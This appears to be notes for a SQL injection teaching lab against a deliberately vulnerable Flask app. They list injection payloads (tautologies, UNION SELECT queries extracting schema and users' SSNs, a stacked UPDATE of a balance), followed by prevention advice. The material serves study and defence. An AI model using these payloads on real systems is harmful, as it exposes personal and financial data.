# TODO

## Attack Queries

### Users
Get data of all users

```sql
' or '1' = '1 
```

- Querying tables info

```sql
' AND '1' = '2' UNION SELECT type, name, tbl_name, rootpage, sql, 'dummy', 'dummy1', 'dummy2' FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%
```

### Cards

Get data of all cards
```sql
' or '1' = '1 
```

Querying data from different tables
- Get `name`, `ssn` of users
```sql
' AND '1' = '1' UNION SELECT name, ssn FROM users --
```

- Get `name`, `camel_id` of users
```sql
' AND '1' = '1' UNION SELECT name, camel_id FROM users --
```

- Querying tables info

```sql
' AND '1' = '2' UNION SELECT sql, name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%
```


### Unable to execute

- Unable to combine multiple queries

```sql
' or '1' = '1; UPDATE users SET balance=1000 WHERE camel_id='4395--
```

## How to prevent SQL Injection?

## Programmatically 

#### Input Sanitizing/Validation

The validity of the input submitted by user is verified. The criterias for input can include:
- Format
- Character
- Length

#### Input Parameterization

Pre-compiling a SQL statement, user input are supplied at the time queries are executed. User input provided to the query are treated as parameters. 

#### `ORM` - Object Relational Mapping



## Coding Practices

### Training

Provide training sessions for engineers to improve their coding practices. Raising awareness on common type of attacks that can rooted from poor code quality.

### Code Quality Assurance

> DevSecOps - Integrating Security into the code's development & delivery process.

- Linter/Static Code Analysis Tools: automated checking source code for programmatic and stylistic errors.

# Sources

[Flask SQL Injection Vulnerable](https://github.com/guilatrova/flask-sqlinjection-vulnerable)